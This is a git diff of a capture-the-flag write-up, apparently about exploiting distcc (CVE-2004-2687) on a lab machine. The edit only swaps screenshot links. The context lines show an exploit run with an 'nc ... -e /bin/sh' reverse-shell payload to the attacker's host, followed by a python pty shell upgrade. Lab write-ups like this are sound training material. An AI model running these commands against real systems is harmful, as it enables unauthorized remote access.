@@ -38,9 +38,9 @@ socket timed out instantly killing the connection. I went back to the exploit an
 So I was going to work my way down from python3 to python.<br>
 Next up,  `python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh"` Success, we get a shell!
 
-![COWABUNGA](https://user-images.githubusercontent.com/110210595/186280016-5a9d0378-3c30-4f95-89e0-c68eea7c86d1.png)
+![proof_of_user_shell](https://user-images.githubusercontent.com/110210595/186280044-7ad463f8-0082-4d42-9e21-3e0b734cc0ed.png)
 
-![image](https://user-images.githubusercontent.com/110210595/185814162-05876fb9-000c-4612-bcfc-bd4d8fc70e88.png)
+![COWABUNGA](https://user-images.githubusercontent.com/110210595/186280016-5a9d0378-3c30-4f95-89e0-c68eea7c86d1.png)
 
 Let's upgrade the shell. I used the following.<br>
 `python -c 'import pty; pty.spawn("/bin/bash")'` python3 and python2 didn't work.<br>
